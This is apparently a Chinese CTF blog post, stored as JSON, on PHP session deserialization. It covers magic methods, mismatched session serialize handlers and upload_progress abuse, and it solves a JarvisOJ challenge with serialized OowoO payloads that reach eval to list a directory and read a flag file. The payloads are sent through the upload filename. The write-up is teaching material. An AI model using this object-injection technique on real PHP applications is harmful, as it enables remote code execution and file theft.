{"title":"Session_unserlize","slug":"session-unserialize","date":"2019-08-01T11:33:07.000Z","updated":"2019-08-10T07:52:37.169Z","comments":true,"path":"api/articles/session-unserialize.json","photos":[],"link":"","excerpt":"session的反序列化利用","covers":["http://wx1.sinaimg.cn/mw690/006boCb9ly1g5jyd32htkj30iv04dt8q.jpg","http://wx4.sinaimg.cn/mw690/006boCb9ly1g5jyiiweobj30ox05n0sx.jpg","https://raw.githubusercontent.com/twosmi1e/twosmi1e.github.io/master/2018/12/20/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1545234989274.png","http://wx2.sinaimg.cn/mw690/006boCb9ly1g5jzfr3tdsj30nx066q3f.jpg","http://wx1.sinaimg.cn/mw690/006boCb9ly1g5k7ltycs7j30we056t8z.jpg","http://wx1.sinaimg.cn/mw690/006boCb9ly1g5k7lqvj32j30r807jgmn.jpg"],"content":"<p>session的反序列化利用</p>\n<a id=\"more\"></a>\n<p>8/1/2019 10:44:57 AM </p>\n<h2 id=\"对魔法函数的再次认识\"><a href=\"#对魔法函数的再次认识\" class=\"headerlink\" title=\"对魔法函数的再次认识\"></a>对魔法函数的再次认识</h2><h3 id=\"常用方法\"><a href=\"#常用方法\" class=\"headerlink\" title=\"常用方法\"></a>常用方法</h3><pre><code>__construct()//创建对象时触发\n__destruct() //对象被销毁时触发\n__call() //在对象上下文中调用不可访问的方法时触发\n__callStatic() //在静态上下文中调用不可访问的方法时触发\n__get() //用于从不可访问的属性读取数据\n__set() //用于将数据写入不可访问的属性\n__isset() //在不可访问的属性上调用isset()或empty()触发\n__unset() //在不可访问的属性上使用unset()时触发\n__invoke() //当脚本尝试将对象调用为函数时触发</code></pre><h4 id=\"序列化机制\"><a href=\"#序列化机制\" class=\"headerlink\" title=\"序列化机制\"></a>序列化机制</h4><pre><code>String\ns:size:value;\nInteger\ni:value;\nBoolean\nb:value; (does not store &quot;true&quot; or &quot;false&quot;, does store &apos;1&apos; or &apos;0&apos;)\nNull\nN;\nArray\na:size:{key definition;value definition;(repeated per element)}\nObject\nO:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}</code></pre><h4 id=\"sleep\"><a href=\"#sleep\" class=\"headerlink\" title=\"__sleep()\"></a>__sleep()</h4><blockquote>\n<p>serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并<strong>返回一个包含对象中所有应被序列化的变量名称的数组</strong>。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。</p>\n</blockquote>\n<p>也就是说序列化时没有被利用到的属性会被清理。</p>\n<h4 id=\"wakeup\"><a href=\"#wakeup\" class=\"headerlink\" title=\"__wakeup()\"></a>__wakeup()</h4><blockquote>\n<p>unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。</p>\n</blockquote>\n<p>也就是说会在<code>unserilize</code>之前准备好可能会用到的对象资源</p>\n<p>拿<a href=\"https://xz.aliyun.com/t/3674#toc-5\" title=\"师傅博客\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/3674#toc-5</a>师傅文章的代码做个例子：</p>\n<pre><code>&lt;?php \nclass Caiji{\npublic function __construct($ID, $sex, $age){\n$this-&gt;ID = $ID;\n$this-&gt;sex = $sex;\n$this-&gt;age = $age;\n$this-&gt;info = sprintf(&quot;ID: %s, age: %d, sex: %s&quot;, $this-&gt;ID, $this-&gt;sex, $this-&gt;age);\n}\n\npublic function getInfo(){\necho $this-&gt;info . &apos;&lt;br&gt;&apos;;\n}\n/**\n * serialize前调用 用于删选需要被序列化存储的成员变量\n * @return array [description]\n */\npublic function __sleep(){\necho __METHOD__ . &apos;&lt;br&gt;&apos;;\nreturn [&apos;ID&apos;, &apos;sex&apos;, &apos;age&apos;];\n}\n\n/**\n * unserialize前调用 用于预先准备对象资源\n */\npublic function __wakeup(){\necho __METHOD__ . &apos;&lt;br&gt;&apos;;\n$this-&gt;info = sprintf(&quot;ID: %s, age: %d, sex: %s&quot;, $this-&gt;ID, $this-&gt;sex, $this-&gt;age);\n}\n}\n\n$me = new Caiji(&apos;Luc1fer&apos;, 20, &apos;male&apos;);\n\n$me-&gt;getInfo();\n//存在__sleep(函数，$info属性不会被存储\n$temp = serialize($me);\necho $temp . &apos;&lt;br&gt;&apos;;\n\n$me = unserialize($temp);\n//__wakeup()组装的$info\n$me-&gt;getInfo();\n\n?&gt;</code></pre><p>执行结果如下 ：</p>\n<p><img src=\"http://wx1.sinaimg.cn/mw690/006boCb9ly1g5jyd32htkj30iv04dt8q.jpg\" alt=\"魔法函数执行结果\"></p>\n<p>如果看不太清楚函数的用法，我们可以再改一下代码看看效果，我们这次注释掉了<code>__sleep()</code>函数，并且在其他函数里增加了提示语句：</p>\n<p><img src=\"http://wx4.sinaimg.cn/mw690/006boCb9ly1g5jyiiweobj30ox05n0sx.jpg\" alt=\"修改之后的效果\"></p>\n<p>可以看到因为<code>sleep</code>的存在，<code>info</code>属性被删除，导致<code>getinfo()</code>使用时无法打印<code>Info</code>属性，在我们注释掉<code>sleep</code>之后，所有的属性都正常打印了，<code>wakeup</code>也是如此。</p>\n<h4 id=\"toString-NaN\"><a href=\"#toString-NaN\" class=\"headerlink\" title=\"__toString()\"></a>__toString()</h4><blockquote>\n<p>__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条E_RECOVERABLE_ERROR 级别的致命错误。</p>\n</blockquote>\n<pre><code>&lt;?php \nclass Caiji{\npublic function __construct($ID, $sex, $age){\n$this-&gt;ID = $ID;\n$this-&gt;sex = $sex;\n$this-&gt;age = $age;\n$this-&gt;info = sprintf(&quot;ID: %s, age: %d, sex: %s&quot;, $this-&gt;ID, $this-&gt;sex, $this-&gt;age);\n}\n\npublic function __toString(){\nreturn $this-&gt;info;\n}\n}\n\n$me = new Caiji(&apos;twosmi1e&apos;, 20, &apos;male&apos;);\necho &apos;__toString:&apos; . $me . &apos;&lt;br&gt;&apos;;\n?&gt;\n\n__toString:ID: twosmi1e, age: 20, sex: male</code></pre><h2 id=\"session-反序列化\"><a href=\"#session-反序列化\" class=\"headerlink\" title=\"session 反序列化\"></a>session 反序列化</h2><p>PHP在session存储和读取时都会有一个序列化和反序列化的过程，php内置了多种处理器用于存取$_SESSION数据，对数据进行序列化与反序列化。</p>\n<p>这是php.ini中的配置项</p>\n<p><img src=\"https://raw.githubusercontent.com/twosmi1e/twosmi1e.github.io/master/2018/12/20/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1545234989274.png\" alt=\"phpinfo配置\"><br><img src=\"https://raw.githubusercontent.com/twosmi1e/twosmi1e.github.io/master/2018/12/20/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1545235002297.png\" alt></p>\n<ul>\n<li><code>session.save_path</code> 设置session的存储路径</li>\n<li><code>session.save_handler</code> 设定用户自定义存储函数</li>\n<li><code>session.auto_start</code> 指定会话模块是否在请求开始时启动一个会话</li>\n<li><code>session.serialize_handler</code> 定义用来序列化/反序列化的处理器名字。默认使用php</li>\n</ul>\n<p>对于处理器，常用的有三种，对应三种不同的处理格式</p>\n<p><img src=\"http://wx2.sinaimg.cn/mw690/006boCb9ly1g5jzfr3tdsj30nx066q3f.jpg\" alt=\"处理器的处理方式\"></p>\n<p>我们可以看看不同储存方式储存的区别：</p>\n<p>选择不同的处理器来生成session，生成的文件就储存在上图对应目录中</p>\n<pre><code>&lt;?\nini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);\nsession_start();\n\n$_SESSION[&apos;name&apos;] = &apos;Luc1fer&apos;;\n\n?&gt;\n\nphp_serilize: a:1:{s:4:&quot;name&quot;;s:7:&quot;Luc1fer&quot;;}\nphp: name|s:7:&quot;Luc1fer&quot;;\nphp_binary: EOT\u0004names:7:&quot;Luc1fer&quot;;</code></pre><p>如果<strong>PHP在反序列化存储的$_SESSION数据时使用的处理器和序列化使用的处理器不同</strong>，会导致数据无法正确反序列化，通过特殊构造甚至可以伪造任意数据。</p>\n<h3 id=\"设置session序列化方法可能带来的隐患\"><a href=\"#设置session序列化方法可能带来的隐患\" class=\"headerlink\" title=\"设置session序列化方法可能带来的隐患\"></a>设置session序列化方法可能带来的隐患</h3><p>如果我们创建一个写入session的脚本</p>\n<pre><code>&lt;?php\nini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);\nsession_start();\n$name = $_GET[&apos;name&apos;] ? $_GET[&apos;name&apos;] : &quot;name&quot;; $value = $_GET[&apos;value&apos;] ? $_GET[&apos;value&apos;] : &quot;value&quot;;\n$_SESSION[name] = $value;  if(isset($_GET[&apos;clean&apos;])) session_destroy();</code></pre><p>此时我们传入<code>value=|s:5:&quot;hack!&quot;;</code>,在进行session存储时的内容就会变成：<code>a:1:{s:4:&quot;name&quot;;s:13:&quot;|s:5:&quot;hack!&quot;;&quot;;}</code>.我们可以知道在<code>php_serialize</code>中<code>a</code>代表一个数组，包含一个元素，但是如果其他的php页面没有设置处理器为<code>php_serialize</code>而使用默认的php，那么在php解释session中的内容时，<code>|</code>前的部分会被解释称键，后的部分会被解释成值，在这里我们传入的<code>s:5:&quot;hack!&quot;;</code>会被解析成<code>hack!&quot;</code>，后面的<code>&quot;;</code>会被忽略。,最后解析的结果就是<code>Array ([a:1:{s:4:&quot;name&quot;;s:13:&quot;}]=&gt;hack!)</code>。</p>\n<p>我们可以通过此来利用反序列化漏洞。</p>\n<h3 id=\"session-upload-progress\"><a href=\"#session-upload-progress\" class=\"headerlink\" title=\"session.upload_progress\"></a>session.upload_progress</h3><blockquote>\n<p>Session 上传进度 </p>\n</blockquote>\n<blockquote>\n<p>当 session.upload_progress.enabledINI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态 </p>\n</blockquote>\n<blockquote>\n<p>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。通常这些键值可以通过读取INI设置来获得。</p>\n</blockquote>\n<p>在POST一个文件前，通过<code>POST</code>一个name为<code>Session.upload_progress</code>，value为用户自定义的一个upload_id。在文件上传过程中会生成上传信息。在上传结束后session中的键值对会直接消失。</p>\n<p>同时还要注意<code>session.upload_progress.cleanup</code>这个参数，这个选项的意思是在上传完成时从session中清除上传进度信息，默认开启。在关闭后上传信息会一直保存在session中。</p>\n<p>通过上面两部分我们可以更改session为自定义数据。</p>\n<h3 id=\"phpinfo\"><a href=\"#phpinfo\" class=\"headerlink\" title=\"phpinfo\"></a>phpinfo</h3><p>JarvisOJ上的题目，题目链接：<a href=\"http://web.jarvisoj.com:32784/\" target=\"_blank\" rel=\"noopener\">http://web.jarvisoj.com:32784/</a></p>\n<pre><code>&lt;?php\n//A webshell is wait for you\nini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);\nsession_start();\nclass OowoO\n{\n    public $mdzz;\n    function __construct()\n    {\n        $this-&gt;mdzz = &apos;phpinfo();&apos;;\n    }\n\n    function __destruct()\n    {\n        eval($this-&gt;mdzz);\n    }\n}\nif(isset($_GET[&apos;phpinfo&apos;]))\n{\n    $m = new OowoO();\n}\nelse\n{\n    highlight_string(file_get_contents(&apos;index.php&apos;));\n}\n?&gt;</code></pre><p>观察到题目phpinfo中的配置</p>\n<p><img src=\"http://wx1.sinaimg.cn/mw690/006boCb9ly1g5k7ltycs7j30we056t8z.jpg\" alt></p>\n<p>构造一个POST页面</p>\n<pre><code>&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;\n&lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;\n&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;\n&lt;input type=&quot;submit&quot; /&gt;\n&lt;/form&gt;</code></pre><p>由题目的<code>phpinfo</code>可知，全局session序列化器设置为了<code>php_serialize</code>，因此<code>upload_progress</code>会用<code>php_serialize</code>的方式创建<code>session</code>文件.在执行<code>index.php</code>时，该代码将处理器设置为了php,然后<code>session_start()</code>来读取session文件。由上文的php序列化器处理方式可知我们在session中构造<code>|序列化字符串</code>就可以。同时该题目的<code>cleanup</code>也设置为了<code>off</code></p>\n<p>然后进行序列化。将处理器设置为<code>php_serialize</code></p>\n<pre><code>&lt;?php\n//A webshell is wait for you\nini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);\nsession_start();\nclass OowoO\n{\npublic $mdzz;\n\n}\n$a = new OowoO();\n$a-&gt;mdzz = &apos;print_r(scandir(dirname(__FILE__)));&apos;;\necho serialize($a);\n?&gt;</code></pre><p>得到</p>\n<pre><code>O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;}</code></pre><p>先在本地打开POST页面，随便提交一个东西然后抓包将<code>filename</code>改为序列化字符串。同时为了达到我们想要的结果要在最前面加上<code>|</code>，同时为了防止转义，在引号前面加上<code>\\</code>.</p>\n<p>读到如下信息</p>\n<p><img src=\"http://wx1.sinaimg.cn/mw690/006boCb9ly1g5k7lqvj32j30r807jgmn.jpg\" alt></p>\n<p>由<code>phpinfo</code>中<code>Apache Environment</code>可知题目路径为<code>/opt/lampp/htdocs/index.php</code></p>\n<p>于是我们修改mdzz的值为</p>\n<pre><code>print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));</code></pre><p>得到</p>\n<pre><code>O:5:\\&quot;OowoO\\&quot;:1:{s:4:\\&quot;mdzz\\&quot;;s:88:\\&quot;print_r(file_get_contents(\\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\\&quot;));\\&quot;;}</code></pre><p>提交得到flag</p>\n<pre><code>$flag=&quot;CTF{4d96e37f4be998c50aa586de4ada354a}&quot;</code></pre><h2 id=\"参考链接：\"><a href=\"#参考链接：\" class=\"headerlink\" title=\"参考链接：\"></a>参考链接：</h2><blockquote>\n<p><a href=\"http://www.qingpingshan.com/bc/php/394154.html\" target=\"_blank\" rel=\"noopener\">http://www.qingpingshan.com/bc/php/394154.html</a></p>\n<p><a href=\"https://www.t00ls.net/articles-48721.html#\" target=\"_blank\" rel=\"noopener\">https://www.t00ls.net/articles-48721.html#</a></p>\n<p><a href=\"https://xz.aliyun.com/t/3674#toc-14\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/3674#toc-14</a></p>\n</blockquote>\n","categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"php","slug":"php","count":7,"path":"api/tags/php.json"},{"name":"serialize","slug":"serialize","count":4,"path":"api/tags/serialize.json"}]}